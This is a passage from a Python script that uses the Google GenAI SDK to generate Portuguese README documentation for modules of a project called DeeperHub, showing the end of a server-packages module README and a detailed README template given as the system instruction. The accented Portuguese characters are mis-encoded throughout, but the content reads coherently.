*   **N√≠vel ERROR:** Falha cr√≠tica no processamento de pagamento. Falha ao persistir `UserPackageInstance` ap√≥s pagamento confirmado.

### 10.4. Telemetria

*   `[:deeper_hub, :server_packages, :definition, :created | :updated | :deleted]`
*   `[:deeper_hub, :user_inventory, :acquisition_attempt, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, package_id: id, payment_method: method}`
    *   No `:stop`: `%{status: :success | :failure_payment | :failure_granting, instance_id: id}`
*   `[:deeper_hub, :user_inventory, :benefit_granting, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, package_instance_id: id, benefit_type: type}`

## ‚ùå 11. Tratamento de Erros

*   **Falha no Pagamento:** O fluxo de aquisi√ß√£o deve parar, nenhum benef√≠cio concedido.
*   **Falha na Concess√£o de Benef√≠cios P√≥s-Pagamento:** Este √© um cen√°rio cr√≠tico. Idealmente, a concess√£o √© parte da mesma transa√ß√£o. Se n√£o for poss√≠vel, o pagamento deve ser reembolsado/estornado, ou a concess√£o deve ser reenfileirada com alta prioridade e monitoramento.
*   Erros de valida√ß√£o na cria√ß√£o de pacotes retornam `{:error, changeset}`.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Valida√ß√£o de Pre√ßos:** Impedir pre√ßos negativos ou absurdamente baixos/altos.
*   **Seguran√ßa do Fluxo de Pagamento:** Se envolver dinheiro real, a integra√ß√£o com o `Payments` deve ser PCI DSS compliant (se aplic√°vel) e seguir todas as melhores pr√°ticas de seguran√ßa para transa√ß√µes financeiras.
*   **Concess√£o de Benef√≠cios:** A l√≥gica no `GrantingService` deve ser segura para evitar que usu√°rios ganhem benef√≠cios indevidamente.
*   **Autoriza√ß√£o:** Apenas propriet√°rios de servidores podem criar pacotes para *seus* servidores. Administradores da plataforma podem ter permiss√µes mais amplas.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   O `benefits_payload` √© um ponto chave de extens√£o. Novos tipos de benef√≠cios exigir√£o novos \"handlers\" no `GrantingService`.
*   A l√≥gica de assinatura pode se tornar um subm√≥dulo pr√≥prio se muito complexa.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar um sistema de cupons de desconto para pacotes.
*   [ ] Permitir \"pacotes de presente\" que um usu√°rio pode comprar para outro.
*   [ ] Suporte para pacotes com quantidade limitada de estoque.
*   [ ] Hist√≥rico de compras detalhado para o usu√°rio.
*   [ ] Ferramentas para propriet√°rios de servidores analisarem as vendas e popularidade de seus pacotes.
*   [ ] Reembolsos e gerenciamento de disputas para pacotes pagos.
*   [ ] Integra√ß√£o com APIs de jogos para concess√£o autom√°tica de itens/benef√≠cios diretamente no jogo.

---

*√öltima atualiza√ß√£o: 2025-05-13*

---

Este m√≥dulo de pacotes adiciona uma camada significativa de funcionalidade e potencial de monetiza√ß√£o.

Pr√≥ximo? Podemos cobrir o `DeeperHub.ServerUpdateMessages` para completar as funcionalidades de \"comunica√ß√£o\" do servidor, ou o m√≥dulo gen√©rico `DeeperHub.Lists`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
    ]
    generate_content_config = types.GenerateContentConfig(
        response_mime_type="text/plain",
        system_instruction=[
            types.Part.from_text(text="""Voc√™ √© um especialista em documenta√ß√£o e arquitetura de sistemas. 
Voc√™ √© excelente em categorizar, especificar e criar arquivos README dos M√≥dulos do Sistema.
Voc√™ organiza, especifica e categoria o m√°ximo ***todas*** as caracter√≠sticas e itens de todos os m√≥dulos de sistemas. Sempre especifica TUDO!

# Template: README para M√≥dulos do DeeperHub

Este √© um template para a cria√ß√£o de arquivos `README.md` para os m√≥dulos do projeto DeeperHub. O objetivo √© padronizar a documenta√ß√£o, tornando-a mais clara, completa e consistente.

**Instru√ß√µes:**
- Substitua `[Nome do M√≥dulo]` pelo nome real do m√≥dulo.
- Adapte e preencha cada se√ß√£o conforme a especificidade do m√≥dulo.
- Remova se√ß√µes que n√£o se aplicam.
- Adicione se√ß√µes espec√≠ficas se necess√°rio.
- Mantenha a linguagem em Portugu√™s (BR) e o uso de emojis üòä.

---

# M√≥dulo: `[Nome do M√≥dulo]` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `[Nome do M√≥dulo]`

<!-- 
Descreva de forma concisa o que este m√≥dulo faz, qual seu prop√≥sito principal e seu papel dentro do sistema DeeperHub. 
Ex: \"O m√≥dulo de Autentica√ß√£o √© respons√°vel por verificar a identidade dos usu√°rios e gerenciar suas sess√µes.\" 
Exemplo para um m√≥dulo de `UserProfile`:
\"O m√≥dulo UserProfile gerencia todos os dados relacionados ao perfil do usu√°rio, como nome, avatar, prefer√™ncias de contato e biografia. Ele fornece uma API para outros m√≥dulos consultarem e atualizarem essas informa√ß√µes.\"
-->

## üéØ 2. Responsabilidades e Funcionalidades Chave

<!-- 
Liste as principais responsabilidades e funcionalidades que este m√≥dulo oferece.
Use bullet points para clareza.
Ex:
- Gerenciar o ciclo de vida das contas de usu√°rio.
- Processar pagamentos e assinaturas.
- Integrar com o sistema de notifica√ß√µes para alertas de seguran√ßa.

Exemplo para `UserProfile`:
- CRUD (Create, Read, Update, Delete) de informa√ß√µes de perfil.
- Valida√ß√£o de dados do perfil (ex: formato de email, tamanho da biografia).
- Gerenciamento de upload e armazenamento de avatares.
- Emiss√£o de eventos de altera√ß√£o de perfil para outros m√≥dulos interessados (ex: `UserProfileUpdatedEvent`).
-->

*   [Funcionalidade/Responsabilidade 1]
*   [Funcionalidade/Responsabilidade 2]
*   [Funcionalidade/Responsabilidade ...]

## üèóÔ∏è 3. Arquitetura e Design

<!-- 
Descreva a arquitetura interna do m√≥dulo. 
- Quais s√£o os principais componentes (ex: GenServers, Supervisores, Contexts, Schemas, Servi√ßos, Adaptadores)?
- Como eles interagem entre si?
- H√° algum padr√£o de design espec√≠fico utilizado (ex: Fachada, Adaptador, Strategy)?
- Se relevante, inclua um diagrama simples ou descreva a estrutura de diret√≥rios do m√≥dulo.
-->

### 3.1. Componentes Principais

<!-- 
Liste e descreva brevemente os componentes mais importantes do m√≥dulo.
Ex:
- `NomeDoModulo.ServicoPrincipal`: Orquestra as opera√ß√µes X, Y, Z.
- `NomeDoModulo.Worker`: Processa tarefas ass√≠ncronas do tipo A.
-->

### 3.2. Estrutura de Diret√≥rios (Opcional)

<!-- 
Se a estrutura de diret√≥rios for complexa ou espec√≠fica, descreva-a aqui.
-->

### 3.3. Decis√µes de Design Importantes

<!-- 
Justifique escolhas de design significativas que foram feitas.
Exemplo:
- \"Optou-se por usar um GenServer (`UserProfile.AvatarProcessor`) para o processamento de avatares de forma ass√≠ncrona, liberando o processo chamador e melhorando a responsividade da API de upload.\"
- \"A comunica√ß√£o com o servi√ßo de armazenamento de arquivos (S3) √© feita atrav√©s de um Adaptador (`StorageAdapter`) para facilitar a substitui√ß√£o do provedor no futuro, seguindo o Princ√≠pio da Invers√£o de Depend√™ncia.\"
-->

## üõ†Ô∏è 4. Casos de Uso Principais

<!-- 
Descreva os cen√°rios mais comuns ou importantes em que este m√≥dulo √© utilizado.
Ex:
- **Registro de Novo Usu√°rio:** Um novo usu√°rio se cadastra na plataforma, e este m√≥dulo valida os dados e cria a conta.
- **Recupera√ß√£o de Senha:** Um usu√°rio esquece a senha e solicita a redefini√ß√£o.

Exemplo para `UserProfile`:
- **Atualiza√ß√£o de Perfil pelo Usu√°rio:** O usu√°rio acessa a p√°gina de configura√ß√µes e altera seu nome e biografia.
- **Consulta de Perfil por Outro M√≥dulo:** O m√≥dulo de `Posts` precisa exibir o nome e avatar do autor de uma postagem.
- **Upload de Novo Avatar:** O usu√°rio seleciona uma nova imagem para seu perfil.
-->

*   **Caso de Uso 1:** [Descri√ß√£o]
*   **Caso de Uso 2:** [Descri√ß√£o]

## üåä 5. Fluxos Importantes (Opcional)

<!-- 
Detalhe fluxos de trabalho ou processos cr√≠ticos que o m√≥dulo executa. 
Pode ser uma sequ√™ncia de passos, intera√ß√µes entre componentes, ou como os dados fluem.
Ex: Fluxo de Autentica√ß√£o com MFA, Fluxo de Processamento de Pedido.

Exemplo para \"Upload de Novo Avatar\" no m√≥dulo `UserProfile`:
1. Usu√°rio envia uma requisi√ß√£o `POST /api/v1/profile/avatar` com a imagem.
2. `UserProfile.AvatarController` recebe a requisi√ß√£o e valida o token de autentica√ß√£o e o tipo/tamanho do arquivo.
3. `UserProfile.AvatarService.upload_avatar/2` √© chamado com o `user_id` e o arquivo.
4. O servi√ßo redimensiona a imagem para tamanhos padronizados (thumbnail, medium).
5. O servi√ßo envia as imagens processadas para o `StorageAdapter`.
6. `StorageAdapter` armazena as imagens (ex: no S3) e retorna as URLs.
7. `UserProfile.AvatarService` atualiza o `UserProfileSchema` do usu√°rio com as novas URLs do avatar.
8. `UserProfile.AvatarService` emite um evento `UserProfileUpdatedEvent` com os dados do perfil atualizado.
9. `UserProfile.AvatarController` retorna uma resposta `200 OK` com as novas URLs do avatar.
-->

1.  Passo 1
2.  Passo 2
3.  ...

## üì° 6. API (Se Aplic√°vel)

<!-- 
Se o m√≥dulo exp√µe uma API (interna ou externa), documente-a aqui.
Para APIs REST:
- Endpoints (m√©todo HTTP e caminho)
- Par√¢metros de entrada (query, path, body)
- Formato das requisi√ß√µes e respostas (JSON)
- Exemplos de requisi√ß√£o e resposta
- Autentica√ß√£o necess√°ria

Para APIs de M√≥dulo Elixir (fun√ß√µes p√∫blicas):
- Assinatura da fun√ß√£o (`@spec`)
- Breve descri√ß√£o do que a fun√ß√£o faz
- Par√¢metros e seus tipos
- Valor de retorno (`{:ok, resultado}` ou `{:error, razao}`)
- Efeitos colaterais

Exemplo para uma fun√ß√£o Elixir do m√≥dulo `UserProfile`:

### `UserProfile.Facade.get_profile/1`

*   **Descri√ß√£o:** Busca o perfil de um usu√°rio pelo seu ID.
*   **`@spec`:** `get_profile(user_id :: String.t()) :: {:ok, UserProfile.Schema.t()} | {:error, :not_found | term()}`
*   **Par√¢metros:**
    *   `user_id` (String): O ID do usu√°rio.
*   **Retorno:**
    *   `{:ok, UserProfile.Schema.t()}`: Em caso de sucesso, retorna o schema do perfil do usu√°rio.
    *   `{:error, :not_found}`: Se o perfil n√£o for encontrado.
    *   `{:error, term()}`: Para outros erros internos.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    case UserProfile.Facade.get_profile(\"user123\") do
      {:ok, profile} -> IO.inspect(profile)
      {:error, reason} -> Logger.error(\"Falha ao buscar perfil: #{inspect(reason)}\")
    end
    ```

Exemplo para um endpoint REST do m√≥dulo `UserProfile`:

### `GET /api/v1/users/{user_id}/profile`

*   **Descri√ß√£o:** Retorna os dados do perfil p√∫blico de um usu√°rio.
*   **Autentica√ß√£o:** Requer token de acesso v√°lido.
*   **Par√¢metros de Caminho (Path Parameters):**
    *   `user_id` (string): ID do usu√°rio.
*   **Resposta de Sucesso (200 OK):**
    ```json
    {
      \"data\": {
        \"user_id\": \"user123\",
        \"username\": \"john_doe\",
        \"bio\": \"Entusiasta de Elixir\",
        \"avatar_urls\": {
          \"thumbnail\": \"https://cdn.example.com/avatars/user123_thumb.jpg\",
          \"medium\": \"https://cdn.example.com/avatars/user123_medium.jpg\"
        }
      }
    }
    ```
*   **Resposta de Erro (404 Not Found):**
    ```json
    {
      \"errors\": [
        {
          \"status\": \"404\",
          \"title\": \"Not Found\",
          \"detail\": \"Perfil do usu√°rio n√£o encontrado.\"
        }
      ]
    }
    ```
-->

### 6.1. [Nome da Fun√ß√£o P√∫blica / Endpoint]

*   **Descri√ß√£o:**
*   **Par√¢metros:**
*   **Retorno:**
*   **Exemplo de Uso (Elixir) / Requisi√ß√£o (HTTP):**

## ‚öôÔ∏è 7. Configura√ß√£o

<!-- 
Descreva como o m√≥dulo pode ser configurado.
- Quais vari√°veis de ambiente ele utiliza?
- Quais chaves de configura√ß√£o s√£o lidas do `DeeperHub.Core.ConfigManager`?
- Quais s√£o os valores padr√£o e como podem ser alterados?

Exemplo:
- **Vari√°veis de Ambiente:**
    *   `USER_PROFILE_MAX_BIO_LENGTH`: \"Controla o n√∫mero m√°ximo de caracteres permitidos na biografia do usu√°rio. Padr√£o: 500\"
- **ConfigManager:**
    *   `:user_profile, :avatar_default_url`: \"URL para uma imagem de avatar padr√£o caso o usu√°rio n√£o tenha uma. Padr√£o: '/images/default_avatar.png'\"
-->

*   **Vari√°veis de Ambiente:**
    *   `VAR_EXEMPLO`: [Descri√ß√£o e valor padr√£o]
*   **ConfigManager:**
    *   `:nome_do_modulo, :parametro_exemplo`: [Descri√ß√£o e valor padr√£o]

## üîó 8. Depend√™ncias

<!-- 
Liste as depend√™ncias do m√≥dulo.
- **M√≥dulos Internos do DeeperHub:** (ex: `DeeperHub.Core.LoggerFacade`, `DeeperHub.Shared.Utils`)
- **Bibliotecas Externas:** (ex: `Ecto`, `Jason`, `Finch`)
- Justifique brevemente depend√™ncias menos √≥bvias.
-->

### 8.1. M√≥dulos Internos

*   `[NomeDoModuloInterno]`

### 8.2. Bibliotecas Externas

*   `[NomeDaBibliotecaExterna]`

## ü§ù 9. Como Usar / Integra√ß√£o

<!-- 
Forne√ßa instru√ß√µes sobre como outros m√≥dulos ou partes do sistema devem interagir com este m√≥dulo.
- Quais s√£o os pontos de entrada principais (fachadas, fun√ß√µes p√∫blicas)?
- H√° algum pr√©-requisito ou setup necess√°rio antes de usar o m√≥dulo?
- Exemplos de c√≥digo de como chamar as funcionalidades principais.
-->

```elixir
# Exemplo de como usar o m√≥dulo
NomeDoModulo.Facade.funcao_principal(argumento1, argumento2)
```

## ‚úÖ 10. Testes e Observabilidade

<!-- 
Descreva a estrat√©gia de testes e observabilidade para este m√≥dulo.
- Como executar os testes unit√°rios e de integra√ß√£o?
- Quais m√©tricas importantes s√£o coletadas (`MetricsFacade`)?
- Quais eventos de telemetria s√£o emitidos?
- Como os logs s√£o estruturados (`LoggerFacade`)?
-->

### 10.1. Testes

<!-- 
Comandos para rodar os testes, localiza√ß√£o dos arquivos de teste.
Exemplo:
- Testes unit√°rios: `mix test test/deeper_hub/user_profile/`
- Teste espec√≠fico: `mix test test/deeper_hub/user_profile/user_profile_service_test.exs:12` (linha 12)
- Cobertura de testes: `mix test --cover`
- Arquivos de teste localizados em `test/deeper_hub/[nome_do_modulo]/`
-->

### 10.2. M√©tricas

<!-- 
Principais m√©tricas expostas.
Ex: `deeper_hub.[nome_do_modulo].funcao_x.count`
Exemplo para `UserProfile`:
- `deeper_hub.user_profile.get_profile.duration_ms` (Histograma): Tempo de resposta da fun√ß√£o `get_profile/1`.
- `deeper_hub.user_profile.avatar_upload.success.count` (Contador): N√∫mero de uploads de avatar bem-sucedidos.
- `deeper_hub.user_profile.avatar_upload.failure.count` (Contador): N√∫mero de uploads de avatar falhos.
-->

### 10.3. Logs

<!-- 
Contexto ou tags importantes adicionadas aos logs.
Exemplo para `UserProfile`:
- Todos os logs do m√≥dulo incluem `{module: UserProfile, function: \"nome_da_funcao/aridade\"}`.
- Opera√ß√µes cr√≠ticas incluem `user_id` e `trace_id` para facilitar a depura√ß√£o e rastreamento.
- Ex: `Logger.info(\"Perfil atualizado\", user_id: user.id, changes: changes)`
-->

### 10.4. Telemetria

<!-- 
Eventos de telemetria importantes emitidos pelo m√≥dulo.
Ex: `[:deeper_hub, :nome_do_modulo, :evento_x, :start]`
Exemplo para `UserProfile`:
- `[:deeper_hub, :user_profile, :avatar_uploaded, :success]`: Emitido ap√≥s um upload de avatar bem-sucedido.
- `[:deeper_hub, :user_profile, :avatar_uploaded, :failure]`: Emitido ap√≥s um upload de avatar falho.
-->

## ‚ùå 11. Tratamento de Erros

<!-- 
Explique como o m√≥dulo lida com erros.
- Quais tipos de erros s√£o retornados (ex: `{:error, :not_found}`, `{:error, {:validation, changeset}}`, exce√ß√µes)?
- Como os chamadores devem tratar esses erros?
-->

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

<!-- 
Descreva quaisquer aspectos de seguran√ßa relevantes para este m√≥dulo.
- O m√≥dulo lida com dados sens√≠veis?
- Quais medidas de seguran√ßa foram implementadas (valida√ß√£o de entrada, sanitiza√ß√£o, controle de acesso)?
- H√° alguma vulnerabilidade conhecida ou potencial?

Exemplo para `UserProfile`:
- **Dados Sens√≠veis:** O m√≥dulo armazena informa√ß√µes pessoais como nome e email (se inclu√≠do no perfil).
- **Valida√ß√£o de Entrada:** Todas as entradas do usu√°rio para atualiza√ß√£o de perfil s√£o validadas usando `Ecto.Changeset` para prevenir dados malformados e ataques b√°sicos de inje√ß√£o.
- **Sanitiza√ß√£o:** A biografia do usu√°rio √© sanitizada para remover HTML/scripts potencialmente maliciosos antes de ser exibida.
- **Controle de Acesso:** Apenas o pr√≥prio usu√°rio (ou administradores) pode modificar seu perfil. Consultas a perfis podem ter diferentes n√≠veis de visibilidade (p√∫blico, amigos, etc. - se aplic√°vel).
- **Upload de Avatar:** Tipos de arquivo e tamanho s√£o rigorosamente validados para prevenir upload de arquivos maliciosos ou excessivamente grandes.
-->

## üßë‚Äçüíª 13. Contribui√ß√£o

<!-- 
Instru√ß√µes para desenvolvedores que desejam contribuir com este m√≥dulo.
- Padr√µes de c√≥digo espec√≠ficos do m√≥dulo.
- Processo para submeter altera√ß√µes (PRs).
- Contato para d√∫vidas.
-->

Consulte as diretrizes gerais de contribui√ß√£o do projeto DeeperHub.

## üîÆ 14. Melhorias Futuras e TODOs

<!-- 
Liste ideias para melhorias futuras, funcionalidades planejadas ou `TODO:`s importantes que ainda precisam ser abordados.
-->

*   [ ] Implementar [Funcionalidade X]
*   [ ] Refatorar [Parte Y] para melhor performance/clareza.
*   Consultar `TODO:`s no c√≥digo para tarefas pendentes.

---

*√öltima atualiza√ß√£o: YYYY-MM-DD*"""),
        ],
    )

    for chunk in client.models.generate_content_stream(
        model=model,
        contents=contents,
        config=generate_content_config,
    ):
        print(chunk.text, end="")

if __name__ == "__main__":
    generate()
